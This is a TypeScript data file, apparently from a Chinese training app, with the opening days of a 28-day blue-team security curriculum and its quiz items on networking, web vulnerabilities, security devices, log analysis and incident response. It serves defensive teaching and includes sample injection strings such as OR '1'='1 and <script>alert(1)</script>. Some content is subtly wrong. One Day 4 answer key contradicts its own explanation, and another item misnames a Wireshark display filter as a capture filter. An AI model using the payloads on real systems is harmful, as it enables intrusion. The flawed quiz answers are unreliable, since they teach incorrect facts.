// 护网工程 - 28天速成上岗计划
// 基于 120天速通护网上岗.md 的28天速成路径
// 与 cyberHw.ts（120天完整版）并行，提供快速上岗路线
import { CyberLearningPlan, CyberDay } from './cyberBasic';

// 28天速成计划每一天的数据
const allDays: CyberDay[] = [

  // ==================== 第一阶段：基础夯实周（Day1-Day7） ====================
  {
    id: 'hw-e28-1', day: 1,
    title: '护网认知 + 网络协议栈',
    subtitle: '基础夯实周（零基础→初级岗达标）',
    objectives: ['明确红蓝紫三类角色分工', '掌握5项值守日常工作', '理解TCP/IP协议栈基础', '能抓包识别SYN/ACK/FIN'],
    keyPoints: ['红蓝紫分工', '5项值守日常', 'TCP/IP协议栈', 'SYN/ACK/FIN标志位', 'Wireshark基础使用'],
    content: `# Day 1：护网认知 + 网络协议栈

> **阶段**：基础夯实周（零基础→初级岗达标）

## 📚 核心学习内容
- 视频：湖科大TCP/IP/HTTP + 护网入门
- 新增：明确红蓝紫分工、5项值守日常
- 文档：FreeBuf护网指南

## 🔧 实操任务
- Wireshark抓取三次握手包，过滤HTTP请求
- 绘制简易网络拓扑

## ✅ 验收标准
- 说出护网3类角色、5项日常工作
- 抓包识别SYN/ACK/FIN`,
    quiz: [
      // 红蓝紫分工
      {question:'护网行动中，"红队"的主要职责是什么？',options:['防守监控和日志分析','模拟攻击、发现安全漏洞','制定安全策略和规章制度','管理安全设备和网络配置'],correctIndex:1,explanation:'红队=攻击方，模拟真实攻击者行为，通过渗透测试发现防守体系的弱点。'},
      {question:'护网行动中，"蓝队"的核心职责不包括以下哪项？',options:['值守监控告警','攻击溯源与应急响应','编写漏洞利用代码','日志分析和事件处置'],correctIndex:2,explanation:'蓝队=防守方，负责监控、检测、响应、溯源。编写漏洞利用代码是红队（攻击方）的工作。'},
      {type:'fill',question:'护网行动中，负责规则制定、平台搭建、裁判评分的第三方中立角色称为____队。',correctAnswer:'紫',explanation:'紫队=裁判/组织方，负责制定规则、搭建演练平台、判罚评分，保持中立立场。'},
      {type:'boolean',question:'护网值守的5项日常工作包括：告警监控、日志分析、事件处置、情报查询、日报撰写。',options:['正确','错误'],correctIndex:0,explanation:'正确。这是蓝队值守的基本工作内容，每天都需要按这五步循环进行。'},
      {type:'multiple',question:'以下哪些是红蓝紫三方在护网中的角色定位？（多选）',options:['红队：模拟真实攻击','蓝队：构建防守体系','紫队：组织裁判和评分','绿队：负责合规审计'],correctIndices:[0,1,2],explanation:'护网三方=红队（攻击）+蓝队（防守）+紫队（裁判）。绿队并非护网经典角色。'},
      // TCP/IP
      {question:'TCP三次握手中，SYN+ACK标志位出现在哪个阶段？',options:['第一次握手','第二次握手','第三次握手','断开连接'],correctIndex:1,explanation:'第二次握手：服务器收到客户端的SYN后，回复SYN+ACK表示同意建立连接。'},
      {question:'TCP四次挥手断开连接时，FIN标志位最先由哪一方发送？',options:['一定是客户端','一定是服务器','可以是任意一方主动发起','双方同时发送'],correctIndex:2,explanation:'TCP断开连接是双向的，客户端或服务器都可以主动发起FIN请求关闭连接。'},
      {type:'fill',question:'TCP报文头部中，ACK标志位配合___序号实现可靠传输确认机制。',correctAnswer:'确认',explanation:'ACK（Acknowledge）+确认序号=TCP可靠传输的核心机制，接收方通过ACK告知发送方"已收到"。'},
      {type:'fill',question:'OSI七层模型中，位于网络层之上、会话层之下的第四层是___层。',correctAnswer:'传输',explanation:'OSI七层从下到上：物理层→数据链路层→网络层→传输层→会话层→表示层→应用层。TCP/UDP位于传输层。'},
      {type:'boolean',question:'TCP协议是面向连接的可靠传输协议，而UDP是无连接的，不保证数据一定送达。',options:['正确','错误'],correctIndex:0,explanation:'正确。TCP通过三次握手建立连接、ACK确认+重传保证可靠；UDP直接发送无确认机制。'},
      {type:'multiple',question:'以下哪些是TCP协议的特性？（多选）',options:['面向连接','可靠传输','流量控制','无连接'],correctIndices:[0,1,2],explanation:'TCP=面向连接+可靠传输+流量控制+拥塞控制。无连接是UDP的特性。'},
      // 网络基础
      {question:'以下哪个IP地址属于私有地址（RFC 1918）？',options:['8.8.8.8','172.16.0.1','202.96.128.86','1.1.1.1'],correctIndex:1,explanation:'私有地址范围：10.0.0.0/8、172.16.0.0/12、192.168.0.0/16。172.16.0.1属于B类私有地址。'},
      {question:'交换机工作在OSI模型的哪一层？',options:['物理层','数据链路层','网络层','传输层'],correctIndex:1,explanation:'交换机基于MAC地址转发，工作在数据链路层（第2层）。路由器基于IP转发，工作在网络层（第3层）。'},
      {type:'fill',question:'子网掩码255.255.255.0对应的CIDR表示法是___。',correctAnswer:'/24',explanation:'255.255.255.0=11111111.11111111.11111111.00000000，即前24位为网络位，CIDR表示为/24。'},
      // Wireshark
      {question:'使用Wireshark抓包时，过滤HTTP请求的显示过滤器语法是？',options:['tcp.port==80','http','ip.src==192.168.1.1','tcp.flags.syn==1'],correctIndex:1,explanation:'Wireshark显示过滤器中，直接输入"http"即可过滤HTTP协议流量。tcp.port==80是捕获过滤器。'},
      {type:'boolean',question:'Wireshark可以抓取HTTPS数据包，但内容是加密的，没有服务器私钥就无法解密查看明文。',options:['正确','错误'],correctIndex:0,explanation:'Wireshark能捕获加密的HTTPS流量，但要解密需要服务器的SSL/TLS私钥（或使用SSLKEYLOGFILE）。'},
      {type:'fill',question:'Wireshark中用于启动抓包操作的快捷键是___。',correctAnswer:'Ctrl+E',explanation:'Ctrl+E是Wireshark启动/停止抓包的快捷键。也可以在工具栏点击鲨鱼鳍图标。'},
      // OSI模型
      {type:'multiple',question:'HTTP协议在OSI模型中属于哪一层？（多选：选出所有相关的）',options:['应用层','表示层','会话层','传输层'],correctIndices:[0,1,2],explanation:'HTTP协议覆盖应用层（请求/响应语义）、表示层（数据编码）和会话层（连接管理），实际横跨OSI上三层。'},
      {type:'fill',question:'ARP（地址解析协议）工作在OSI模型第___层和第___层之间，负责将IP地址解析为MAC地址。',correctAnswer:'2/3',explanation:'ARP将网络层IP地址（第3层）解析为数据链路层MAC地址（第2层），工作在第2-3层之间。'},
      {type:'boolean',question:'DNS协议默认使用TCP端口53进行域名解析。',options:['正确','错误'],correctIndex:1,explanation:'错误。DNS默认使用UDP端口53（查询），仅在区域传输和大响应时使用TCP端口53。'},
      {question:'蓝队值守时收到一条告警：某内网IP向外部C2域名发起DNS查询，这最可能意味着什么？',options:['正常的上网行为','主机可能已被植入后门','DNS服务器配置错误','网络设备故障'],correctIndex:1,explanation:'内网主机向已知C2域名发起DNS查询，是恶意软件尝试连接C2服务器的典型行为，需立即排查。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-2', day: 2,
    title: 'HTTP协议 + 高频漏洞原理',
    subtitle: '基础夯实周（零基础→初级岗达标）',
    objectives: ['说清5种HTTP状态码含义', '理解SQL注入基础原理', '理解XSS基础原理', '了解OWASP Top10'],
    keyPoints: ['HTTP状态码', 'SQL注入', 'XSS跨站脚本', 'OWASP Top10', '漏洞原理'],
    content: `# Day 2：HTTP协议 + 高频漏洞原理

> **阶段**：基础夯实周（零基础→初级岗达标）

## 📚 核心学习内容
- 视频：米斯特Web安全前6集 + 护网漏洞盘点
- 新增：OWASP Top10名称与危害清单
- 文档：CNVD + 先知社区历年Top10

## 🔧 实操任务
- Vulhub搭建SQL注入靶场
- 手工触发报错注入现象

## ✅ 验收标准
- 说清5种状态码含义
- 理解SQL注入/XSS基础原理`,
    quiz: [
      // HTTP协议
      {question:'以下哪个HTTP状态码表示"服务器内部错误"？',options:['200','301','403','500'],correctIndex:3,explanation:'5xx系列表示服务器错误。200=成功，301=永久重定向，403=禁止访问，500=内部服务器错误。'},
      {question:'HTTP状态码403表示什么含义？',options:['请求成功','页面被永久重定向','禁止访问/权限不足','请求的资源不存在'],correctIndex:2,explanation:'403 Forbidden=服务器理解请求但拒绝执行，通常表示权限不足或IP被封锁。'},
      {question:'HTTP响应头中，哪个字段告诉浏览器本次响应的数据格式？',options:['User-Agent','Content-Type','Set-Cookie','X-Forwarded-For'],correctIndex:1,explanation:'Content-Type定义响应体的MIME类型（如application/json、text/html）。User-Agent是请求头。'},
      {type:'fill',question:'HTTP请求中，GET方法将参数附加在URL的问号之后，而POST方法将参数放在请求____中。',correctAnswer:'体/Body',explanation:'GET参数在URL QueryString中（有长度限制），POST参数在Body中（无长度限制，适合传输大量数据）。'},
      {type:'fill',question:'HTTP响应头___用于设置或更新客户端的Cookie信息。',correctAnswer:'Set-Cookie',explanation:'Set-Cookie响应头告诉浏览器存储Cookie。Cookie常用于会话管理（如session_id）和身份追踪。'},
      {type:'boolean',question:'HTTP请求头X-Forwarded-For记录的是客户端真实IP，攻击者无法伪造。',options:['正确','错误'],correctIndex:1,explanation:'错误！X-Forwarded-For可以被攻击者任意伪造，不能作为IP溯源的唯一依据，需结合其他日志交叉验证。'},
      {type:'multiple',question:'HTTP请求方法中，以下哪些属于常用方法？（多选）',options:['GET','POST','PUT','DELETE'],correctIndices:[0,1,2,3],explanation:'GET(查询)、POST(提交)、PUT(更新)、DELETE(删除)均为HTTP常用方法，对应CRUD操作。'},
      // SQL注入
      {question:'SQL注入攻击的核心原理是什么？',options:['窃取管理员密码','将恶意SQL语句拼接到用户输入中执行','DDoS攻击数据库','加密数据库文件勒索'],correctIndex:1,explanation:'SQL注入本质=用户输入未过滤直接拼入SQL语句，攻击者通过构造特殊输入改变SQL查询逻辑。'},
      {question:'以下哪个字符在SQL注入中最常用于闭合前面的SQL语句？',options:['分号 ;','单引号 \'','感叹号 !','井号 #'],correctIndex:1,explanation:'单引号\'常用于闭合SQL字符串参数，改变原有查询逻辑。在SQL注入Payload中极为常见。'},
      {type:'boolean',question:'使用预编译语句（Prepared Statement）是防御SQL注入最有效的方法之一。',options:['正确','错误'],correctIndex:0,explanation:'正确。预编译将SQL结构与数据分离，参数值不会被当作SQL代码执行，从根源上防止注入。'},
      {type:'fill',question:'SQL注入中，使用___子句可以让攻击者构造永远为真的条件（如 OR 1=1），绕过登录验证。',correctAnswer:'OR',explanation:'OR 1=1使WHERE条件恒为真，如 SELECT * FROM users WHERE name=\'admin\' OR \'1\'=\'1\'，可绕过密码验证。'},
      // XSS
      {question:'XSS跨站脚本攻击中的"跨站"一词，指的是什么？',options:['跨不同网站攻击','恶意脚本跨越信任边界在受害者浏览器中执行','跨服务器攻击','跨操作系统攻击'],correctIndex:1,explanation:'XSS本质=攻击者将恶意脚本注入到可信页面中，脚本在受害者浏览器中执行，跨越了攻击者→受害者之间的信任边界。'},
      {type:'multiple',question:'XSS攻击的三种主要类型包括？（多选）',options:['反射型XSS','存储型XSS','DOM型XSS','SQL型XSS'],correctIndices:[0,1,2],explanation:'三种类型=反射型（即时回显）、存储型（持久化在服务器）、DOM型（客户端JS操作DOM）。SQL型XSS不存在。'},
      {type:'fill',question:'防御XSS攻击最关键的输出编码原则是对HTML特殊字符进行___编码，如将<转为&lt;。',correctAnswer:'HTML实体',explanation:'HTML实体编码将<转为&lt;、>转为&gt;、&转为&amp;等，使特殊字符失去HTML/JS语义，被当作纯文本显示。'},
      // OWASP Top10
      {type:'multiple',question:'以下哪些属于OWASP Top10(2021)常见Web安全风险？（多选）',options:['失效的访问控制','加密机制失效','注入攻击','不安全的设计','软件和数据完整性故障'],correctIndices:[0,1,2,3,4],explanation:'以上五项均为OWASP Top10(2021)成员。完整列表还包括安全配置错误、认证失效等。'},
      {type:'fill',question:'OWASP Top10(2021)中排名第一的安全风险是___。',correctAnswer:'失效的访问控制',explanation:'失效的访问控制（Broken Access Control）从2017的第5位升至2021的第1位，指未正确执行用户权限限制。'},
      {type:'boolean',question:'OWASP Top10 每4年更新一次，最新版本是2021版。',options:['正确','错误'],correctIndex:0,explanation:'正确。OWASP Top10约每4年更新一次，目前最新为2021版（2017→2021→预计2025）。'},
      // Web安全综合
      {question:'在Vulhub搭建靶场时发现某页面URL为 /product?id=1，输入?id=1\' 后页面报数据库错误，这说明什么？',options:['网站被DDoS','存在SQL注入漏洞','服务器硬盘故障','网络连接中断'],correctIndex:1,explanation:'输入单引号触发数据库报错回显，说明参数直接拼入SQL语句未做过滤，典型SQL注入漏洞特征。'},
      {question:'蓝队分析Web日志时发现大量请求包含<script>alert(1)</script>，应判定为哪种攻击？',options:['SQL注入攻击','XSS跨站脚本探测','文件上传攻击','CSRF攻击'],correctIndex:1,explanation:'<script>alert(1)</script>是XSS测试Payload中最经典的一个，攻击者通常在探测阶段使用它验证XSS漏洞是否存在。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-3', day: 3,
    title: '主流安全设备 + IDS/IPS',
    subtitle: '基础夯实周（零基础→初级岗达标）',
    objectives: ['区分防火墙/WAF/IDS的作用', '理解IDS/IPS检测原理', '熟练封禁IP和查询情报'],
    keyPoints: ['防火墙 vs WAF', 'IDS/IPS检测原理', 'IP封禁操作', '微步情报查询', 'Snort基础规则'],
    content: `# Day 3：主流安全设备 + IDS/IPS

> **阶段**：基础夯实周（零基础→初级岗达标）

## 📚 核心学习内容
- 视频：深信服NGAF + 奇安信WAF
- 新增：理解防火墙与WAF区别、IDS/IPS检测原理
- 文档：厂商手册 + 微步情报查询

## 🔧 实操任务
- Demo环境完成IP封禁
- 了解Snort基础规则
- 完成1次情报查询

## ✅ 验收标准
- 区分防火墙/WAF/IDS作用
- 熟练封禁IP和查情报`,
    quiz: [
      // 防火墙 vs WAF
      {question:'传统防火墙和WAF（Web应用防火墙）最本质的区别是什么？',options:['防火墙更贵','WAF更小','防火墙工作在网络层/传输层，WAF工作在应用层','防火墙不需要配置规则'],correctIndex:2,explanation:'传统防火墙基于IP/端口过滤（第3-4层），WAF解析HTTP内容检测SQL注入/XSS等应用层攻击（第7层）。'},
      {question:'IDS和IPS最核心的区别是什么？',options:['没有区别','IDS旁路检测告警，IPS在线主动阻断','IPS旁路检测，IDS在线阻断','IDS只能看日志不能告警'],correctIndex:1,explanation:'IDS（入侵检测系统）旁路部署只检测告警；IPS（入侵防御系统）在线部署可主动阻断攻击流量。'},
      {type:'fill',question:'WAF（Web应用防火墙）主要工作在OSI模型的第___层。',correctAnswer:'7',explanation:'WAF工作在应用层（第7层），专门防护Web应用攻击如SQL注入、XSS、CSRF等。'},
      {type:'boolean',question:'WAF（Web应用防火墙）工作在OSI模型的应用层（第7层）。',options:['正确','错误'],correctIndex:0,explanation:'正确。WAF工作在应用层，专门防护Web应用攻击如SQL注入、XSS等。而传统防火墙工作在网络层/传输层。'},
      // 安全设备功能对比
      {question:'以下哪种安全设备专门用于检测和阻断DDoS攻击？',options:['WAF','IDS','抗DDoS设备/流量清洗','堡垒机'],correctIndex:2,explanation:'抗DDoS/流量清洗设备专门应对大流量攻击（SYN Flood、UDP Flood等），通过流量分析和清洗保护网络可用性。'},
      {type:'multiple',question:'IDS/IPS的检测方法主要包括哪些？（多选）',options:['基于签名的检测','基于异常的检测','基于状态的协议分析','基于AI的行为分析'],correctIndices:[0,1,2,3],explanation:'以上均为IDS/IPS主流检测方法。基于签名=匹配已知攻击特征；基于异常=偏离正常基线；协议分析=检查RFC合规性。'},
      {type:'fill',question:'Snort是一款开源的___系统，支持自定义规则进行入侵检测。',correctAnswer:'IDS/入侵检测',explanation:'Snort是经典的网络入侵检测系统(NIDS)，支持自定义规则语法（如alert tcp any any -> any any），也可配置为IPS模式。'},
      {question:'Snort规则中，"alert tcp any any -> 192.168.1.0/24 80" 含义是？',options:['阻断所有TCP流量','对发往192.168.1.0/24网段80端口的TCP流量产生告警','允许所有流量','记录但忽略'],correctIndex:1,explanation:'Snort规则=alert(动作) tcp(协议) any any(源) -> dest port(目标)，匹配时触发告警。'},
      // IP封禁与情报查询
      {question:'在微步在线查询一个IP时，如果该IP被标记为"扫描器"标签，蓝队应如何处置？',options:['忽略不管','立即封禁该IP','视扫描频率和范围决定封禁或加黑名单','联系ISP投诉'],correctIndex:2,explanation:'扫描器IP不一定都要封禁（如果是合法扫描器）。需根据扫描频率、是否命中资产、是否有后续攻击综合判断。'},
      {type:'boolean',question:'在护网值守中封禁一个IP后，这个IP就永远不会再来攻击了。',options:['正确','错误'],correctIndex:1,explanation:'错误！攻击者可以更换IP（代理/VPN/肉鸡）。封禁IP只是临时缓解手段，需配合溯源和加固。'},
      {type:'fill',question:'查询IP威胁情报时，除了微步在线，还可以使用___（英文名）进行多引擎交叉验证。',correctAnswer:'VirusTotal',explanation:'VirusTotal整合70+安全厂商引擎，可交叉验证IP/域名/文件是否为恶意。注意：上传文件前确认不涉及敏感数据。'},
      // 安全设备部署
      {question:'在典型企业网络架构中，防火墙通常部署在什么位置？',options:['内网核心交换机之后','边界（互联网入口处）','每台终端电脑上','数据库服务器内部'],correctIndex:1,explanation:'防火墙是边界防护第一关，部署在互联网与企业内网之间。内网纵深防御中也可在内部分区之间部署防火墙。'},
      {type:'multiple',question:'以下哪些属于护网值守中常用的安全设备？（多选）',options:['防火墙','WAF','IDS/IPS','SIEM/SOC平台','EDR终端检测响应'],correctIndices:[0,1,2,3,4],explanation:'以上均为护网值守核心设备。防火墙+WAF=边界，IDS/IPS=检测，SIEM=日志关联，EDR=终端防护。'},
      {type:'fill',question:'安全运营中心的核心平台是___系统，负责统一接入各设备日志并进行关联分析。',correctAnswer:'SIEM',explanation:'SIEM（安全信息与事件管理）=日志汇聚+关联规则+告警生成+仪表盘，是SOC的"大脑"。'},
      {type:'boolean',question:'部署了IDS就不需要部署IPS了，两者功能重复。',options:['正确','错误'],correctIndex:1,explanation:'错误。IDS只检测不阻断，IPS可主动阻断。实际部署中常串联使用：IDS用于深度检测分析，IPS用于在线防护。'},
      // 实战
      {question:'护网值守时发现某内网IP频繁访问外部未知IP的8080端口，应首先做什么？',options:['忽略，可能是正常业务','查询该外部IP的威胁情报','直接重启内网主机','拔掉网线'],correctIndex:1,explanation:'先查情报确认外联IP性质，再决定处置方式。盲目处置可能中断正常业务，不处置可能错过C2通信。'},
      {type:'fill',question:'IPS在线部署模式也称为___模式，所有流量必须经过IPS检查后才能通过。',correctAnswer:'串联/串行/inline',explanation:'IPS串联（inline）在流量路径中，实时检测并阻断恶意流量。IDS旁路部署只复制流量分析。'},
      {question:'堡垒机（跳板机）的核心功能是什么？',options:['检测网络攻击','统一管理运维入口、审计操作记录','加密网络通信','扫描系统漏洞'],correctIndex:1,explanation:'堡垒机=运维安全审计系统，所有运维操作通过堡垒机进行，实现权限控制+操作审计+会话录像。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-4', day: 4,
    title: '全类型日志分析（Web+系统）',
    subtitle: '基础夯实周（零基础→初级岗达标）',
    objectives: ['能从日志中识别扫描特征', '能从日志中发现暴力破解', '找出异常登录事件', '记住4624/4625事件ID含义'],
    keyPoints: ['Web日志分析', 'Nginx日志', 'Windows事件日志', '4624/4625登录事件', 'Syslog格式', 'grep日志筛选'],
    content: `# Day 4：全类型日志分析（Web+系统）

> **阶段**：基础夯实周（零基础→初级岗达标）

## 📚 核心学习内容
- 视频：Web日志分析 + Nginx日志 + Windows事件日志
- 新增：重点记住4624/4625登录事件ID含义
- 文档：事件ID表、Syslog格式

## 🔧 实操任务
- 分析100条混合日志（含Linux/Win）
- 用grep筛选攻击IP

## ✅ 验收标准
- 能从日志中识别扫描、暴力破解特征
- 找出异常登录事件`,
    quiz: [
      // Windows事件日志
      {question:'Windows安全事件日志中，事件ID 4624代表什么？',options:['登录失败','登录成功','权限提升','账户被锁定'],correctIndex:1,explanation:'4624=登录成功，4625=登录失败。大量4625事件通常意味着暴力破解攻击正在发生。'},
      {question:'Windows事件ID 4625，结合短时间内大量出现、同一用户名多次失败，应判定为什么？',options:['正常用户输错密码','暴力破解攻击','系统自动维护','网络波动'],correctIndex:0,explanation:'错误！大量4625+同用户名=暴力破解典型特征。需立即封禁来源IP并通知该用户修改密码。'},
      {type:'fill',question:'Windows安全事件ID___表示登录成功，ID___表示登录失败。',correctAnswer:'4624/4625',explanation:'4624=登录成功（含登录类型，如类型10=远程交互式登录），4625=登录失败（含失败原因代码）。'},
      {type:'fill',question:'Windows事件日志中，事件ID 4672表示___权限被分配给新登录。',correctAnswer:'特殊/管理员',explanation:'4672=特殊权限登录，通常意味着该账户具有管理员级别权限。需重点关注是否有非管理员账户触发此事件。'},
      {type:'boolean',question:'Windows事件ID 4625的出现一定意味着暴力破解攻击正在发生。',options:['正确','错误'],correctIndex:1,explanation:'错误。偶尔的4625可能是用户输错密码，需要结合频率（短时间大量）和模式（同一用户多次）综合判断。'},
      // Linux日志
      {question:'Linux系统中，认证相关的日志通常记录在哪个文件中？',options:['/var/log/messages','/var/log/auth.log 或 /var/log/secure','/var/log/boot.log','/var/log/cron'],correctIndex:1,explanation:'Debian/Ubuntu使用/var/log/auth.log，CentOS/RHEL使用/var/log/secure，记录SSH登录、su/sudo等认证事件。'},
      {type:'fill',question:'在Linux中，使用 tail ___ 命令可以持续实时查看日志文件新增内容。',correctAnswer:'-f',explanation:'tail -f 持续监听文件末尾新增内容，是日志实时监控最常用的命令之一。tail -f /var/log/auth.log 可实时看SSH登录。'},
      {type:'fill',question:'Linux系统中，使用___命令可以筛选日志中包含特定关键词的行，如 grep "Failed" /var/log/auth.log。',correctAnswer:'grep',explanation:'grep是Linux文本搜索利器。常用选项：-i(忽略大小写)、-v(反向匹配)、-c(计数)、-n(显示行号)。'},
      {question:'Linux日志中出现大量"Failed password for root from 10.x.x.x"，说明什么？',options:['root用户频繁操作','SSH暴力破解攻击','NTP时间同步','网络丢包'],correctIndex:1,explanation:'Failed password=SSH登录失败=暴力破解。大量root登录失败说明攻击者在尝试猜解root密码，高危。'},
      // Web日志
      {question:'Nginx访问日志中，以下哪个状态码最常见于目录扫描/探测行为？',options:['200','301','404','500'],correctIndex:2,explanation:'目录扫描会产生大量404（不存在），攻击者通过返回码判断哪些目录存在。短时间内大量404是扫描行为强特征。'},
      {type:'multiple',question:'分析Web日志时，以下哪些特征表明可能正在遭受目录扫描？（多选）',options:['短时间内大量404响应','同一IP不断尝试不同的URL路径','User-Agent中包含扫描器标识','请求间隔均匀且机械化'],correctIndices:[0,1,2,3],explanation:'以上均为目录扫描典型特征。大量404+路径遍历+扫描器UA+机械间隔，四者叠加基本可判定扫描行为。'},
      {type:'fill',question:'Nginx日志中的___字段记录了客户端真实IP地址，是最基本的溯源依据。',correctAnswer:'remote_addr/$remote_addr',explanation:'Nginx日志中$remote_addr记录TCP连接对端IP。注意：如果有反向代理，需配合X-Forwarded-For获取真实客户端IP。'},
      {type:'boolean',question:'分析Web日志时只需要看POST请求，GET请求不包含攻击Payload。',options:['正确','错误'],correctIndex:1,explanation:'错误！SQL注入、XSS、命令注入等攻击Payload都可以放在GET请求的URL参数中（如?id=1\' OR \'1\'=\'1）。'},
      // syslog与日志管理
      {type:'fill',question:'___是类Unix系统中标准的日志传输协议，默认使用UDP端口514。',correctAnswer:'Syslog',explanation:'Syslog是Unix/Linux标准日志协议。企业常部署Syslog服务器（如rsyslog、syslog-ng）集中收集所有设备的日志。'},
      {question:'日志分析中，"时间线还原"的核心目的是什么？',options:['满足合规要求','按时间顺序串起攻击者的每个动作，还原完整攻击过程','统计日志大小','找出日志缺失'],correctIndex:1,explanation:'时间线还原=将多源日志按时间排序、串联攻击事件，从"第一个探测包"到"最后一个外传包"，呈现完整攻击链条。'},
      // grep
      {type:'multiple',question:'以下哪些grep命令选项在日志分析中非常实用？（多选）',options:['-i 忽略大小写','-v 反向匹配排除','-c 统计匹配行数','-n 显示匹配行行号','-A 显示匹配行之后的内容'],correctIndices:[0,1,2,3,4],explanation:'以上全部常用。-i无视大小写、-v排除噪音、-c快速统计、-n定位行号、-A/-B显示上下文。'},
      {question:'使用grep从混合日志中提取所有来自某IP的请求行，以下哪个命令最合适？',options:['grep "192.168.1.100" access.log','cat access.log > 192.168.1.100','find 192.168.1.100 access.log','awk "192.168.1.100" access.log'],correctIndex:0,explanation:'grep直接在文件中按模式搜索，"192.168.1.100"为搜索模式。其他命令语法均不正确。'},
      // 实战
      {type:'boolean',question:'在护网值守中，发现一条可疑告警后应该立即封禁来源IP，无需进一步分析。',options:['正确','错误'],correctIndex:1,explanation:'错误！应先核查告警真伪、确认攻击成功与否、评估影响范围，再决定处置方式。盲目封禁可能影响正常业务。'},
      {question:'一台服务器/var/log/auth.log出现大量root登录失败，但ssh端口22未对外开放，最可能的原因是什么？',options:['日志记录错误','攻击者已通过其他方式进入内网并从内部发起攻击','服务器自动生成日志','电信运营商行为'],correctIndex:1,explanation:'SSH端口未对外开放但出现暴力破解日志，说明攻击者可能已通过VPN/跳板/内网横向等方式进入内网。需立即排查。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-5', day: 5,
    title: '告警研判SOP + 应急响应流程',
    subtitle: '基础夯实周（零基础→初级岗达标）',
    objectives: ['独立完成单条告警全流程处理', '说出应急响应6个阶段', '掌握告警核查-研判-处置-闭环四步法'],
    keyPoints: ['告警研判SOP', 'PDCERF模型', '核查-研判-处置-闭环', '应急响应6阶段', '值班台账模板'],
    content: `# Day 5：告警研判SOP + 应急响应流程

> **阶段**：基础夯实周（零基础→初级岗达标）

## 📚 核心学习内容
- 视频：微步值守实战 + PDCERF模型
- 新增：告警核查-研判-处置-闭环四步法
- 文档：GB/T 28875 + 值班台账模板

## 🔧 实操任务
- 模拟端口扫描+暴力破解告警
- 走通完整处置流程并填单

## ✅ 验收标准
- 独立完成单条告警全流程
- 说出应急响应6个阶段`,
    quiz: [
      // PDCERF与告警研判
      {question:'应急响应PDCERF模型中，字母"C"代表哪个阶段？',options:['检测(Detection)','遏制(Containment)','清除(Eradication)','响应(Response)'],correctIndex:1,explanation:'PDCERF=准备(Prepare)→检测(Detect)→遏制(Contain)→根除(Eradicate)→恢复(Recover)→跟踪(Follow-up)。'},
      {question:'PDCERF模型中，哪个阶段是蓝队应答的第一步（尚未发生攻击时就应完成）？',options:['检测(Detect)','遏制(Contain)','准备(Prepare)','恢复(Recover)'],correctIndex:2,explanation:'准备阶段（P）在攻击发生前就应完成：制定预案、配备工具、培训人员、建立通讯机制。'},
      {type:'fill',question:'PDCERF模型的六个阶段英文全称是：Prepare、Detect、___、Eradicate、Recover和Follow-up。',correctAnswer:'Contain',explanation:'Contain=遏制，核心目的是限制攻击范围、防止事态扩大，如断网、隔离VLAN、禁用账户。'},
      {type:'multiple',question:'以下哪些属于PDCERF模型中"遏制(Containment)"阶段的典型动作？（多选）',options:['隔离受影响主机','封禁攻击IP','禁用被攻破的账号','分析攻击来源'],correctIndices:[0,1,2],explanation:'遏制阶段=止血。隔离主机、封禁IP、禁用账户。分析攻击来源属于后续的根除/溯源阶段。'},
      // 告警研判四步法
      {type:'boolean',question:'告警研判的四步法是"告警核查→研判→处置→闭环"，每一步都要有记录可追溯。',options:['正确','错误'],correctIndex:0,explanation:'正确。四步法确保每条告警都有完整可追溯的处理记录和闭环结果。'},
      {question:'告警研判四步法中，"核查"阶段最核心的动作是什么？',options:['直接封禁IP','确认告警描述的攻击是否真实发生','填写处置台账','通知上级领导'],correctIndex:1,explanation:'核查=确认真伪。不核查就直接处置，可能将正常业务误判为攻击，或忽视真正的入侵。核查四维度=源IP+Payload+目标资产+关联告警。'},
      {type:'fill',question:'告警研判四步法的顺序是：核查→___→处置→闭环。',correctAnswer:'研判',explanation:'研判=综合核查结果做判断：真实攻击/疑似/误报，定级P0-P3，决定处置优先级和方式。'},
      {type:'multiple',question:'告警核查的四个维度包括哪些？（多选）',options:['源IP核查（情报查询）','Payload核查（攻击载荷分析）','目标资产核查（是否存在该漏洞）','关联核查（同一IP的其他告警）'],correctIndices:[0,1,2,3],explanation:'以上四项均属核查维度。源IP看标签、Payload看恶意性、资产看漏洞匹配度、关联看攻击意图。'},
      // P0-P3告警分级
      {question:'发现一个IP正在对核心数据库服务器进行成功的SQL注入攻击，应定级为？',options:['P0','P1','P2','P3'],correctIndex:0,explanation:'核心资产+成功入侵=P0最高级别，需立即启动全员应急响应。P1=高危告警，P2=可疑行为，P3=低风险/探测。'},
      {type:'boolean',question:'告警分级中，P3级别（低风险/探测）的告警可以完全忽略不处理。',options:['正确','错误'],correctIndex:1,explanation:'错误！P3仍需记录和定期汇总分析。虽然不需要立即处置，但大量P3可能是攻击前期侦察，汇总后可能发现攻击模式。'},
      {type:'fill',question:'告警分级P0-P3中，P0代表___级别，通常意味着核心资产已被攻破。',correctAnswer:'最高/紧急/严重',explanation:'P0=最高紧急级别，需要立即启动应急响应流程（PDCERF）。典型场景：核心系统被成功入侵、数据泄露进行中。'},
      // 值守台账与闭环
      {question:'告警处置完成后，为什么必须填写值班台账？',options:['满足领导要求','确保处置过程可追溯、可复盘、可交接','填台账比处置本身更重要','台账填写是考核指标'],correctIndex:1,explanation:'台账=记忆外挂。确保信息不丢失、交接班不断档、事后可复盘分析、出现问题时能追溯责任。'},
      {type:'fill',question:'蓝队值守人员处理完一条告警后，必须在___中记录处置过程、结果和后续关注事项。',correctAnswer:'值班台账/台账',explanation:'值班台账包含：告警时间、告警类型、源IP、核查结果、研判结论、处置动作、闭环状态、交接备注。'},
